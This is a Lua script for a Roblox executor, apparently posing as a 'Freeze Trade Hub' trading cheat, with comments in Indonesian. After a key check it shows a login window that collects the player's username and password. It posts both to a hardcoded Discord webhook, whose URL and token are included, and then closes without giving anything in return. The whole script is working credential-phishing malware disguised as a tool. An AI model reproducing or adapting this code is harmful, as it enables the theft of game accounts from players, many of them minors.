-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi Membuat GUI Login
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Freeze Trade Hub"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 24
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundTransparency = 1
    title.Parent = frame

    local usernameBox = Instance.new("TextBox")
    usernameBox.PlaceholderText = "Insert Username"
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 60)
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.TextSize = 14
    usernameBox.Parent = frame

    local passwordBox = Instance.new("TextBox")
    passwordBox.PlaceholderText = "Insert Password"
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 120)
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.TextSize = 14
    passwordBox.Parent = frame

    local loginButton = Instance.new("TextButton")
    loginButton.Text = "Login"
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 180)
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.Parent = frame

    loginButton.MouseButton1Click:Connect(function()
        if usernameBox.Text ~= "" and passwordBox.Text ~= "" then
            sendToDiscord(usernameBox.Text, passwordBox.Text)
            gui:Destroy()
        else
            print("Harap isi semua kolom!")
        end
    end)
end

-- Fungsi Membuat GUI Key Validation
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.Parent = gui

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Parent = frame

    local keyBox = Instance.new("TextBox")
    keyBox.PlaceholderText = "Insert Key"
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    keyBox.Font = Enum.Font.SourceSans
    keyBox.TextSize = 14
    keyBox.Parent = frame

    local errorLabel = Instance.new("TextLabel")
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    errorLabel.TextSize = 14
    errorLabel.Text = ""
    errorLabel.Parent = frame

    local verifyKeyButton = Instance.new("TextButton")
    verifyKeyButton.Text = "Verify Key"
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.Parent = frame

    verifyKeyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == correctKey then
            print("Key benar!")
            gui:Destroy()
            createLoginGUI() -- Panggil GUI kedua setelah validasi
        else
            errorLabel.Text = "Key salah! Silahkan coba lagi."
        end
    end)
end

-- Memulai GUI Key Validation
createKeyValidationGUI()
